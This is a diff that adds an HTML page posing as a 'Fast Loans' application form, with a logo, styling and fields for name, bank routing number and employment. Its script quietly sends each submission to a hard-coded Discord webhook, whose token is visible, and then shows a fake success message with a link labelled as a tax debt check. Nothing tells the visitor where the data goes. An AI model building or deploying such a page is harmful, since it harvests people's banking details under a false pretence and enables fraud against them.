@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fast Loans</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            padding: 20px;
+        }
+        header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        header img {
+            width: 300px;
+        }
+        form {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        form label {
+            display: block;
+            margin-bottom: 10px;
+        }
+        form input, select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        form button {
+            width: 100%;
+            padding: 10px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .success-message {
+            text-align: center;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <img src="https://www.shutterstock.com/image-vector/fast-loans-logo-design-money-600nw-1990116266.jpg" alt="Fast Loans">
+        <h1>Get Your Fast Loan Today!</h1>
+    </header>
+
+    <form id="loanForm">
+        <label for="fname">First and Last Name:</label>
+        <input type="text" id="fname" name="fname" required>
+
+        <label for="routing">Routing Number:</label>
+        <input type="text" id="routing" name="routing" required>
+
+        <label for="employment">Employment:</label>
+        <select id="employment" name="employment" required>
+            <option value="Yes">Yes</option>
+            <option value="No">No</option>
+        </select>
+
+        <button type="submit">Submit</button>
+    </form>
+
+    <div class="success-message" id="successMessage" style="display: none;">
+        <p>Form successfully submitted!</p>
+        <p>You can check your <a href="https://gtaw.link/debtgov">tax debt here</a>.</p>
+    </div>
+
+    <script>
+        document.getElementById('loanForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const formData = {
+                fname: document.getElementById('fname').value,
+                routing: document.getElementById('routing').value,
+                employment: document.getElementById('employment').value
+            };
+
+            fetch('https://discord.com/api/webhooks/1296976317954134087/AgrNdtpjRDosieSU6FO6kU5ySIqE42dQ2HzfqS0W24q6qaQA9P16kTjuT215at1u1lw2', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `New Loan Form Submission:\nName: ${formData.fname}\nRouting Number: ${formData.routing}\nEmployment: ${formData.employment}`
+                })
+            }).then(response => {
+                if (response.ok) {
+                    document.getElementById('loanForm').style.display = 'none';
+                    document.getElementById('successMessage').style.display = 'block';
+                } else {
+                    alert('There was an issue submitting the form. Please try again.');
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred. Please try again later.');
+            });
+        });
+    </script>
+
+</body>
+</html>
